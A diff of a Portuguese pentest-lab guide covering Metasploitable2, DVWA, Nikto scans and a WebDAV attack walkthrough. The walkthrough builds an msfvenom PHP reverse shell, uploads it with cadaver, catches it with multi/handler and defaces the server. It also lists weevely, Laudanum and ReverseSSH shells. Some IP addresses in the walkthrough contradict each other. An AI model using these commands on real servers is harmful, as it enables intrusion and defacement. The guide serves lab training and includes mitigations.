@@ -8,24 +8,33 @@
    - [Vantagens da Arquitetura](#vantagens-da-arquitetura)
    - [Recomendações Técnicas](#recomendações-técnicas)
 3. [Distribuições e Imagens](#distribuições-e-imagens-utilizadas)
-   - [Metasploitable2](#1-metasploitable2---maquina-virtual-vulneravel)
-   - [DVWA](#2-dvwa---damn-vulnerable-web-application)
-   - [Vulhub](#3-vulhub---ambientes-docker-com-cves)
-   - [Kali Linux](#4-kali-linux---distribuicao-para-testes-de-invasao)
+   - [Metasploitable2](#31-metasploitable2---maquina-virtual-vulneravel)
+   - [DVWA](#32-dvwa---damn-vulnerable-web-application)
+   - [Vulhub](#33-vulhub---ambientes-docker-com-cves)
+   - [Kali Linux](#34-kali-linux---distribuicao-para-testes-de-invasao)
 4. [Iniciando Laboratórios](#iniciando-laboratorios)
    - [Recursos e Links](#recursos-e-links)
    - [Configuração dos Hosts](#tabela-de-hosts)
    - [Configuração de Redes](#tabela-de-redes-do-virtual-box)
-5. [Primeiros Scans](#fazendo-os-primeiros-scans)
-   - [NMAP - Conceitos Básicos](#o-que-é-o-nmap)
-   - [Exemplos de Uso](#exemplos-basicos-de-uso)
-   - [Análise de Serviços](#analise-de-servico-identificado-com-nmap)
-   - [Exploração de Vulnerabilidades](#exploracao-com-metasploit)
-6. [Nikto - Scanner Web](#nikto)
-   - [Visão Geral](#o-que-é-o-nikto)
-   - [Funcionalidades](#funcionalidades-principais)
-   - [Considerações Técnicas](#considerações-técnicas)
-   - [Exemplos de Uso](#exemplos-de-uso)
+5. [Análise de Vulnerabilidade: vsftpd](#56-análise-de-vulnerabilidade-vsftpd-234)
+   - [Contexto do Backdoor](#contexto-histórico)
+   - [Funcionamento](#funcionamento)
+   - [Impacto](#impacto)
+   - [Exploração](#exploracao-com-metasploit)
+   - [Verificação](#verificacao-com-nmap)
+   - [Exploit Manual](#exploit-manual-python)
+6. [Análise de Vulnerabilidade: Nikto Scanner](#6-análise-de-vulnerabilidade-nikto-scanner)
+   - [Detalhes da Ferramenta](#detalhes-da-ferramenta)
+   - [Exploração Prática](#exploração-prática)
+   - [Mitigações e Recomendações](#mitigações-e-recomendações)
+   - [Documentação e Recursos](#documentação-e-recursos-adicionais)
+   - [Exemplo de Relatório](#exemplo-de-relatório-completo)
+7. [Exploração Avançada](#67-análise-de-vulnerabilidade-payload-maliciosos-com-msfvenom)
+   - [Payload com Msfvenom](#payload-com-msfvenom)
+   - [Exploração WebDAV](#exploint-usando-um-método-http-put-com-cadaver)
+   - [Ferramentas Alternativas](#68-ferramentas-alternativas-para-exploração-webdav)
+   - [Mitigações](#mitigações-contra-exploração-webdav)
+   - [Detecção](#detecção-de-shells-web)
 
 <hr>
 
@@ -68,11 +77,11 @@
 
 ### 3.1 Metasploitable2 - Máquina Virtual Vulnerável
 
-**Link para download:**
+**Link para download:**  
 https://sourceforge.net/projects/metasploitable/
 
-**Descrição:**
-Distribuição Linux projetada com diversas falhas propositalmente. Ideal para testes com Nmap, Nessus, OpenVAS, etc.
+**Descrição:**  
+Distribuição Linux projetada com diversas falhas propositalmente implementadas. Ideal para testes com Nmap, Nessus, OpenVAS e outras ferramentas de análise de vulnerabilidades.
 
 **Credenciais padrão:**
 - Usuário: msfadmin
@@ -80,37 +89,44 @@ Distribuição Linux projetada com diversas falhas propositalmente. Ideal para t
 
 **Requisitos:**
 - VMware ou VirtualBox
-- Alocar 1 GB de RAM e pelo menos 10 GB de disco
+- 1 GB de RAM (mínimo)
+- 10 GB de disco (mínimo)
+- Rede configurada em modo NAT ou Host-only
 
----
+### 3.2 DVWA - Damn Vulnerable Web Application
 
-### 2. DVWA - Damn Vulnerable Web Application
-
-**Repositorio GitHub:**
+**Repositório GitHub:**  
 https://github.com/digininja/DVWA
 
-**Descricao:**
-Aplicacao web vulneravel escrita em PHP/MySQL. Simula diversas falhas: SQL Injection, XSS, CSRF, etc.
+**Descrição:**  
+Aplicação web vulnerável desenvolvida em PHP/MySQL. Simula diversas vulnerabilidades comuns:
+- SQL Injection
+- Cross-Site Scripting (XSS)
+- Cross-Site Request Forgery (CSRF)
+- File Inclusion
+- Command Injection
 
-**Passos para instalacao (Linux com Apache e MySQL):**
-
+**Instalação (Linux com Apache e MySQL):**
 ```bash
+# Clone do repositório
 git clone https://github.com/digininja/DVWA.git
+
+# Configuração do ambiente web
 sudo cp -r DVWA /var/www/html/
 sudo chown -R www-data:www-data /var/www/html/DVWA
+
+# Inicialização dos serviços
 sudo service apache2 start
 sudo service mysql start
 ```
 
-**Configuracao:**  
-Edite o arquivo `config/config.inc.php` para ajustar as credenciais do MySQL.
+**Configuração:**  
+1. Edite o arquivo `config/config.inc.php`
+2. Configure as credenciais do MySQL
+3. Acesse http://localhost/DVWA/setup.php
+4. Clique em "Create / Reset Database"
 
-**Banco de dados:**  
-Acesse http://localhost/DVWA/setup.php e clique em "Create / Reset Database".
-
----
-
-### 3. Vulhub - Ambientes Docker com CVEs
+### 3.3 Vulhub - Ambientes Docker com CVEs
 
 **Repositorio GitHub:**  
 https://github.com/vulhub/vulhub
@@ -132,8 +148,6 @@ docker-compose up -d
 
 **Exemplo de uso:**  
 Ambiente WordPress vulneravel a CVE-2019-8942 sera exposto nas portas padroes para testes com ferramentas como Nikto, Nmap, etc...
-
----
 
 ### 4. Kali Linux - Distribuicao para Testes de Invasao
 
@@ -358,67 +372,275 @@ https://www.exploit-db.com/exploits/49757
 
 ### Nikto
 
-#### 6.1 O que é o Nikto?
+### 6. Análise de Vulnerabilidade: Nikto Scanner
 
-O Nikto é uma ferramenta de código aberto, escrita em Perl, utilizada para escanear servidores web em busca de vulnerabilidades conhecidas. Ela realiza verificações abrangentes em servidores HTTP/HTTPS, identificando arquivos e scripts potencialmente perigosos, configurações incorretas e versões vulneráveis de softwares.
+#### Detalhes da Ferramenta
 
-#### 6.2 Funcionalidades Principais
+##### Contexto Técnico
+O Nikto é uma das ferramentas mais populares para varredura de vulnerabilidades web, desenvolvida em Perl. É mantida como projeto open source e faz parte do arsenal padrão de ferramentas do Kali Linux. A ferramenta é conhecida por sua base de dados extensa, que inclui mais de 6400 arquivos potencialmente perigosos e mais de 1200 versões de servidores.
 
-- **Detecção de Vulnerabilidades:** Identifica arquivos e scripts inseguros
-- **Análise de Versões:** Verifica versões de software conhecidas por serem vulneráveis
-- **Avaliação de Configurações:** Identifica configurações de segurança incorretas (ex: permissões perigosas de arquivos)
-- **Suporte Abrangente:** Realiza testes contra servidores HTTP/HTTPS
-- **Recursos Avançados:** Suporta autenticação básica, proxy, SSL, e ataques a hosts virtuais
+##### Funcionamento
+- **Motor de Scan:** Realiza requisições HTTP/HTTPS para identificar problemas
+- **Base de Dados:** Utiliza arquivo db_tests para verificações
+- **Plugins:** Sistema modular que permite extensão das funcionalidades
+- **Tuning Options:** Permite ajuste fino das verificações realizadas
 
-#### 6.3 Considerações Técnicas
+##### Capacidades Principais
+- Identificação de mais de 6400 arquivos/CGIs potencialmente perigosos
+- Verificação de mais de 1200 versões de servidores desatualizadas
+- Problemas específicos em mais de 270 tipos de servidores
+- Problemas de configuração de SSL/TLS
+- Identificação de arquivos de backup e arquivos expostos
 
-- **Detecção:** O Nikto não é stealth, ou seja, ele não tenta evitar detecção por IDS/IPS
-- **Ambiente de Uso:** É uma excelente ferramenta de validação inicial em ambientes de teste e homologação
-- **Precisão:** Pode gerar muitos falsos positivos, pois utiliza uma base ampla de assinaturas
+##### Impacto e Riscos
+- **Exposição de Informações:** Pode revelar versões, tecnologias e configurações
+- **Falsos Positivos:** Alta taxa de falsos positivos requer análise manual
+- **Footprinting:** Deixa rastros evidentes nos logs do servidor
+- **Carga no Servidor:** Pode impactar o desempenho durante o scan
 
-#### 6.4 Exemplos de Uso
+#### Exploração Prática
 
-#### 1. Scan Básico
+##### 1. Scan Básico no DVWA
 ```bash
-nikto -h http://192.168.100.14
-```
-> Realiza um scan básico no servidor web alvo.
-
-#### 2. Scan com SSL
-```bash
-nikto -h https://192.168.100.14 -ssl
-```
-> Executa scan em servidor HTTPS.
-
-#### 3. Scan com Autenticação
-```bash
-nikto -h http://192.168.100.14 -id admin:senha123
-```
-> Realiza scan usando credenciais de autenticação básica.
-
-#### 4. Scan com Saída em Arquivo
-```bash
-nikto -h http://192.168.100.14 -output relatorio.html -Format html
-```
-> Gera relatório em formato HTML.
-
-### 6.5 Documentação e Recursos
-
-- **GitHub:** [https://github.com/sullo/nikto](https://github.com/sullo/nikto)
-- **Site Oficial:** [https://cirt.net/Nikto2](https://cirt.net/Nikto2)
-- **Wiki:** [https://github.com/sullo/nikto/wiki](https://github.com/sullo/nikto/wiki)
-
-### 6.6 Prática no Laboratório
-
-Vamos executar um scan básico no servidor web do nosso laboratório:
-
-```bash
-nikto -h http://192.168.100.11
+nikto -h http://192.168.100.14 -C all
 ```
 
-#### Resultado do Scan
+Resultado:
+```
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.100.14
++ Target Hostname:    192.168.100.14
++ Target Port:        80
++ Start Time:         2024-01-20 14:25:47 (GMT-3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ Retrieved x-powered-by header: PHP/7.4.3
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined.
++ Cookie PHPSESSID created without the httponly flag
++ Web Server returns a valid response with junk HTTP methods
++ OSVDB-3268: /config/: Directory indexing found
++ OSVDB-3092: /config.php: This might be interesting...
+```
+
+##### 2. Scan com Autenticação no DVWA
+```bash
+nikto -h http://192.168.100.14 -id admin:password -C all
+```
+
+##### 3. Scan Focado em SSL/TLS
+```bash
+nikto -h https://192.168.100.14 -ssl -C all
+```
+
+#### Mitigações e Recomendações
+
+1. **Configurações do Servidor Web:**
+   - Implementar cabeçalhos de segurança (X-Frame-Options, X-XSS-Protection)
+   - Desabilitar listagem de diretórios
+   - Remover arquivos desnecessários e de backup
+
+2. **Hardening de SSL/TLS:**
+   - Desabilitar protocolos SSL/TLS obsoletos
+   - Configurar cipher suites seguros
+   - Implementar HSTS
+
+3. **Controle de Acesso:**
+   - Implementar autenticação em áreas sensíveis
+   - Configurar corretamente permissões de arquivos
+   - Usar WAF (Web Application Firewall)
+
+#### Documentação e Recursos Adicionais
+
+- **Documentação Oficial:** [https://cirt.net/Nikto2](https://cirt.net/Nikto2)
+- **GitHub do Projeto:** [https://github.com/sullo/nikto](https://github.com/sullo/nikto)
+- **Wiki com Tutoriais:** [https://github.com/sullo/nikto/wiki](https://github.com/sullo/nikto/wiki)
+- **CVE Database:** [https://cve.mitre.org/](https://cve.mitre.org/)
+
+#### Exemplo de Relatório Completo
+
+Vamos realizar um scan completo em nosso servidor de laboratório:
+
+```bash
+nikto -h http://192.168.100.14 -Tuning 123bde -Format htm -output nikto-report.html
+```
+
 ![Resultado do scan do Nikto](./nikto.png)
 
-> O scan do Nikto mostra diversas vulnerabilidades potenciais encontradas no servidor web, incluindo versões de software, arquivos sensíveis e configurações incorretas.
+> O relatório mostra várias vulnerabilidades potenciais, incluindo:
+> - Versões desatualizadas de software
+> - Configurações incorretas de segurança
+> - Arquivos sensíveis expostos
+> - Problemas com cabeçalhos HTTP de segurança
+
+
 
 ---
+#### 6.7 Análise de Vulnerabilidade: Payload maliciosos com Msfvenom
+
+Primeiramente vamos scannear a rede para detectar o host comprometido
+nikto -h http://192.168.100.11
+
+
+![Resultado do scan do Nikto](./lab-n-1.png)
+
+O output do Nikto confirmará se o método PUT está habilitado no servidor de destino. Se mostrar que o método PUT está aberto, o servidor estará vulnerável a ataques de upload de arquivos.
+
+Usaremos o Msfvenom, uma ferramenta poderosa para gerar payloads para o Metasploit. Geraremos um payload TCP reverso do PHP Meterpreter, que nos permitirá estabelecer uma conexão shell reversa com a máquina alvo.
+
+Execute o seguinte comando no Kali Linux para gerar o payload PHP:
+
+
+![Comando](./lab-n-2.png)
+
+```bash
+$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.10.10 lport=5555 -f raw > webshell.php
+```
+Obs: 192.168.10.10 ip do atacante.
+
+Isso gerará o código PHP para o shell reverso. Copie o código do payload e salve-o como um arquivo chamado webshell.php na sua máquina Kali.
+
+##### Exploint usando um Método HTTP PUT com cadaver
+
+1. Usando o Cadaver para Upload de Arquivos
+ - O Cadaver é uma ferramenta de linha de comando pré-instalada no Kali Linux que permite o upload e download de arquivos de servidores WebDAV.
+  Para usar o Cadaver para fazer upload do arquivo webshell.php, siga estes passos:
+
+2. Abra o terminal no Kali Linux e execute:
+```bash 
+$ cadaver http://192.168.100.11/dav/
+
+dav:/dav/> put webshell.php
+
+```
+Retorno: 
+
+![Comando Cadaver](./lab-n-3.png)
+
+Feito isso so validar se o webshell.php esta no servidor comprometido.
+Utilizando o navegador de sua preferencia, e usando o endereco incial. No nosso caso, http://192.168.100.11/dav validar se oarquivo webshell.php foi copiado para o servidor vuneravel.
+
+![http](./lab-n-4.png)
+
+uhuuu o arquivo do reverso esta ali :D 
+
+- agora vamos iniciar o shell reverso para ter acesso ao servidor
+voltando ao cli do kali
+
+e vamos entrar no msfconsole
+
+```bash
+msf6 > use exploit/multi/handler
+msf6 > set payload php/meterpreter/reverse_tcp
+msf6 > set lhost 192.168.100.11
+msf6 > set lport 5555
+msf6 > exploit
+
+```
+
+![exploit sendo ativo](./lab-n-5.png)
+
+No browser clique no link: 
+-   http://192.168.10.11/dav/webshell.php
+
+Que vimos anteriornetne, e este abrirá o tunel reverso apra a maquina
+digitando sysinfo aparecerá informacoes sobre o servidor. 
+Entraremos no shell do servidor invadido, e criaremos um arquivo hacked.html no servidor web... para marcar a nossa presença.
+
+![hacked](./lab-n-6.png)
+
+#### 6.8 Ferramentas Alternativas para Exploração WebDAV
+
+##### 1. davtest
+```bash
+# Testa upload de diferentes tipos de arquivos via WebDAV
+davtest -url http://192.168.100.11/dav/
+```
+> O davtest automatiza o teste de upload de vários tipos de arquivos (.php, .asp, .html, etc) e verifica quais são executáveis no servidor.
+
+##### 2. wfuzz
+```bash
+# Fuzzing de métodos HTTP permitidos
+wfuzz -c -z list,PUT-DELETE-MOVE-COPY-PROPFIND -X FUZZ http://192.168.100.11/dav/
+```
+> Útil para descobrir métodos HTTP habilitados no servidor WebDAV.
+
+##### 3. curl
+```bash
+# Teste manual de métodos WebDAV
+curl -X PROPFIND -H "Depth: 1" http://192.168.100.11/dav/
+```
+> Ferramenta versátil para testar manualmente diferentes métodos WebDAV.
+
+##### 4. Weevely - Gerador de Shell PHP
+```bash
+# Gera um shell PHP mais discreto
+weevely generate senha123 shell.php
+# Upload via WebDAV
+cadaver http://192.168.100.11/dav/
+dav:/dav/> put shell.php
+# Conecta ao shell
+weevely http://192.168.100.11/dav/shell.php senha123
+```
+> Weevely gera shells PHP mais difíceis de detectar e oferece funcionalidades adicionais.
+
+##### 5. ReverseSSH
+```bash
+# No servidor atacante
+reversessh -l 192.168.100.10 -p 4444
+# No alvo (após upload do cliente)
+./reversessh -c 192.168.100.10 -p 4444
+```
+> Alternativa para estabelecer conexões reversas via SSH.
+
+##### 6. Laudanum
+```bash
+# Copia o shell do Laudanum
+cp /usr/share/webshells/laudanum/php/shell.php .
+# Modifica as credenciais padrão
+sed -i 's/default_password/sua_senha/g' shell.php
+# Upload via WebDAV
+cadaver http://192.168.100.11/dav/
+dav:/dav/> put shell.php
+```
+> Coleção de shells web injetáveis com recursos avançados.
+
+#### Mitigações contra Exploração WebDAV
+
+1. **Configuração do Servidor:**
+   - Desabilitar WebDAV se não for necessário
+   - Restringir métodos HTTP permitidos
+   - Implementar autenticação forte
+
+2. **Filtros de Upload:**
+   - Bloquear extensões perigosas (.php, .asp, etc)
+   - Validar conteúdo dos arquivos
+   - Implementar limites de tamanho
+
+3. **Monitoramento:**
+   - Logging de acessos WebDAV
+   - Alertas para uploads suspeitos
+   - Monitoramento de conexões reversas
+
+4. **Hardening:**
+   - Manter software atualizado
+   - Usar WAF (Web Application Firewall)
+   - Implementar políticas de segurança rigorosas
+
+#### Detecção de Shells Web
+
+```bash
+# Procura por shells PHP conhecidos
+grep -r "shell_exec\|system\|passthru\|exec" /var/www/html/
+
+# Monitora conexões suspeitas
+netstat -antp | grep ESTABLISHED
+
+# Verifica uploads recentes
+find /var/www/html/ -type f -mtime -1
+```
+
+---
+
+
